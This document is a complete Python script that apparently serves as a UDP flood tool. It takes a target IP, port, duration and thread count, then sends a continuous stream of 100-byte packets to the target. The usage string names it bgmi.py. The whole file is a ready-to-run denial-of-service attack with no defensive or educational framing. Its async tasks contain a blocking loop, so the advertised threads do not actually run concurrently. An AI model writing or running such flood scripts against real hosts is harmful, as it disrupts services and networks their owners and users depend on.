#!/usr/bin/env python3

import argparse
import asyncio
import socket
import time

async def send_udp_packets(ip, port, duration, size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.connect((ip, port))

    end_time = time.time() + duration
    while time.time() < end_time:
        sock.send(b"\x99" * size)

async def main():
    parser = argparse.ArgumentParser(description="Usage: ./bgmi.py <IP> <Port> <Time> <Threads>")
    parser.add_argument('ip', type=str, help='Target IP address')
    parser.add_argument('port', type=int, help='Target port number')
    parser.add_argument('duration', type=int, help='Duration of the task in seconds')
    parser.add_argument('threads', type=int, help='Number of threads to use')

    args = parser.parse_args()

    size = 100  # Define the packet size
    tasks = [send_udp_packets(args.ip, args.port, args.duration, size) for _ in range(args.threads)]

    await asyncio.gather(*tasks)

if __name__ == '__main__':
    asyncio.run(main())
